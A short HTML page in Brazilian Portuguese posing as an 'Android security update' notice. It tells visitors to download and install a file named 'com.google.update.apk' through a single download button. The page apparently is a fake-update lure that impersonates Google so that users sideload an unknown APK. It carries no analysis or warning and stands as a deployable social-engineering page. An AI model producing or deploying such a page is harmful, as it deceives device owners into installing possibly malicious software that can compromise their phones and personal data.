<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Atualização de Segurança do Sistema</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding: 40px;
    }
    .container {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
      display: inline-block;
    }
    h1 {
      color: #333;
    }
    p {
      color: #666;
      font-size: 16px;
      margin-bottom: 30px;
    }
    .btn {
      background-color: #2196f3;
      color: white;
      padding: 15px 25px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
    }
    .btn:hover {
      background-color: #1976d2;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Atualização de Segurança do Android</h1>
    <p>Para manter seu dispositivo protegido e funcionando corretamente, baixe e instale a atualização de segurança mais recente.</p>
    <a href="com.google.update.apk" class="btn" download>Baixar Atualização</a>
  </div>
</body>
</html>
